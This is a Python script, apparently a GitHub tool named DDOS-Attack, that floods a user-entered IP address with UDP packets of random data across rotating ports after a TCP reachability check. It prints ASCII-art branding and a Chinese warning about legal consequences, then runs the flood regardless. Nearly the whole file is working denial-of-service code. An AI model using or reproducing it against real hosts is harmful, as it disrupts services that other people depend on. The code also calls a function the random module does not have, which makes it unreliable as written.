import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = random.urandom(1490)
#############

os.system("clear")
os.system("figlet DDOS-Attack")
print("Author    : BC-U809")
print("GitHub    : https://github.com/BC-809/DDOS-Attack.git")
print("")

ip = input("IP Target : ")
port = int(input("Port       : "))
max_packets = int(input("Max Packets : "))

# ---------- Target reachability check ----------
def check_target(ip, port):
    """Try a TCP connection, return True if successful, else False."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, port))
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

print("[*] Checking target...")
if not check_target(ip, port):
    print("DDOS-Attack------ERROR")
    sys.exit(1)
# ----------------------------------------------

os.system("clear")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("M       MMM M       MMM MMM     MMM MM       MM   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   BC-809")
print("M        MM M        MM MMM     MMM MM       MM   BC-809")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("严重警告")
print("你已经触碰到了法律和道德边缘，如果你不想被人唾弃或者坐牢，请立即退出")
time.sleep(3)

sent = 0
while sent < max_packets:
    try:
        sock.sendto(data, (ip, port))
        sent += 1
        port += 1
        print(f"Sent {sent} packet to {ip} through port:{port}")
        if port == 65534:
            port = 1
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        sys.exit()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit()

print(f"\n[+] Finished. Total packets sent: {sent}")
